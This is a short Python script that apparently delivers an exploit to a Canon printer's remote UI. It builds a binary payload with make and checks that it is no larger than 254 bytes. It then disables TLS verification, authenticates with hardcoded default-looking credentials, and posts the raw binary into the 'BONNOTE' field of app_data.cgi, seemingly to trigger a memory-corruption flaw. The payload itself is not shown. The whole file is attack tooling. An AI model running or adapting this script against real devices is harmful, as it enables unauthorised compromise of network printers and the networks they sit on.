import xml.dom.minidom
import urllib3, requests
import urllib.parse
import os

assert os.system("make") == 0
assert len(open("a.bin", "rb").read()) <= 254

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

s = requests.Session()
s.verify = False
s.auth = ("ADMIN", "canon")

r = s.post("https://192.168.1.159/rui/app_data.cgi", data = {
    "SETINFO": "0", "BONNOTE": open("a.bin", "rb").read()})
r.raise_for_status()

